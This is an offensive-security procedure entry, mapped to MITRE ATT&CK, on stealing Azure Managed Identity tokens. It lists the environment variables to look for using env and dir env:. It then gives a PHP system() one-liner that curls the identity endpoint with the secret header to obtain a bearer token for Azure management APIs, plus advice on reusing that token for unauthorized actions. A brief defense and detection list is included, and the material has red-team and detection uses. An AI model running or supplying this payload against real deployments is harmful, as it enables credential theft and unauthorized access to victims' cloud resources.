---
id: 10347224-c030-4b73-8155-6f173e7d079e
name: Azure-Managed-Identity-Token-Theft-via-Environment-Variables
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.166657+00:00'
updated_at: '2023-05-24T16:00:22.793564+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques: []
platforms:
  - Cloud
  - Linux
  - Web
  - Windows
tags:
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Environment Variables]]'
  - '[[tags/php]]'
  - '[[tags/Token from Managed Identity]]'
  - '[[tags/Web Applications]]'
commands:
  - '[[commands/bash-display-environment-variables]]'
  - '[[commands/powershell-display-environment-variables]]'
tools: []
validated: true
---

# Azure-Managed-Identity-Token-Theft-via-Environment-Variables

## Summary

This procedure demonstrates how to steal an Azure Managed Identity token by exploiting unsecured environment variables on a compromised host or vulnerable web application. By accessing variables like IDENTITY_ENDPOINT and IDENTITY_HEADER, an attacker can request authentication tokens to impersonate the identity and access Azure resources such as storage accounts or virtual machines.

## Description

Azure Managed Identities provide applications with automatic authentication to Azure services without managing credentials explicitly. However, these identities rely on environment variables (IDENTITY_ENDPOINT for the token endpoint URL and IDENTITY_HEADER for the secret header) that are set on the host or application runtime. If an attacker gains code execution on a system assigned a Managed Identity—such as through a web application vulnerability—they can read these variables and use them to fetch a valid access token via the Azure Instance Metadata Service (IMDS). This token can then be used for unauthorized API calls to Azure resources. The technique targets cloud environments where Managed Identities are enabled, particularly on Linux or Windows VMs, App Services, or Functions, and is effective against misconfigurations where environment variables are accessible to untrusted code.

## Requirements

1. Compromised access to a host or web application running on an Azure resource with a Managed Identity enabled.
2. Ability to execute commands or code (e.g., via RCE in a PHP web app).
3. Knowledge of the target Azure resource type (e.g., VM, App Service) to understand variable exposure.

## Defense

Defensive measures and detection strategies:

- Secure environment variables by using Azure Key Vault or managed identity-specific configurations instead of direct exposure.
- Implement least-privilege access for Managed Identities, limiting roles to only necessary Azure resources.
- Monitor Azure activity logs for anomalous token usage, such as access from unexpected IPs or unusual resource calls.
- Enable host-level logging (e.g., Sysmon on Windows, auditd on Linux) to detect environment variable reads or curl requests to IMDS endpoints.
- Use Azure Security Center to alert on potential identity abuse and rotate identities periodically.

## Objectives

1. Extract the IDENTITY_ENDPOINT and IDENTITY_HEADER environment variables.
2. Use these variables to request and steal a valid access token for the Managed Identity.
3. Leverage the token to perform unauthorized actions in the Azure environment, such as reading storage blobs or managing VMs.

## Instructions

### Step 1: Identify Environment Variables (Optional - Bash)

**Context**: If shell access is available on a Linux host, display all environment variables to locate IDENTITY_ENDPOINT (the IMDS token endpoint, typically http://169.254.169.254/metadata/identity/oauth2/token) and IDENTITY_HEADER (the X-IDENTITY-HEADER secret). This step helps confirm the presence of Managed Identity variables before proceeding to token theft.

**Command** ([[commands/bash-display-environment-variables]]):
```bash
env
```

> This command lists all environment variables in key=value format. Search the output for lines starting with IDENTITY_ to identify the endpoint and header. If found, note their values for use in the next step. If not present, the host may not have a Managed Identity enabled.

### Step 2: Identify Environment Variables (Optional - PowerShell)

**Context**: On a Windows host with PowerShell access, enumerate environment variables to find IDENTITY_ENDPOINT and IDENTITY_HEADER. This is useful for Azure VMs or App Services running on Windows, providing an alternative to Bash for variable discovery.

**Command** ([[commands/powershell-display-environment-variables]]):
```powershell
dir env:
```

> This command displays environment variables as directory listings. Filter the output (e.g., using Select-String for 'IDENTITY') to locate the relevant variables. Success confirms the variables are exposed and ready for token extraction.

### Step 3: Extract Token Using PHP Code Execution

**Context**: With code execution in a PHP-based web application (e.g., via file upload or command injection vulnerability), use a system call to curl the IMDS endpoint with the environment variables. This fetches a bearer token for the management.azure.com resource, allowing impersonation of the Managed Identity.

**Code** ([[codes/PHP-System-Call-to-Curl-Azure-Identity-Token]]):
```php
system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
```

> Execute this code in the vulnerable PHP context. The curl command sends a GET request to the IDENTITY_ENDPOINT with the specified resource and API version, authenticating via the IDENTITY_HEADER. The response will contain a JSON object with the access_token field, which is the stolen token. Verify by checking for a 200 OK response and parsing the JSON for the token. Use this token in subsequent Authorization: Bearer headers for Azure API calls.
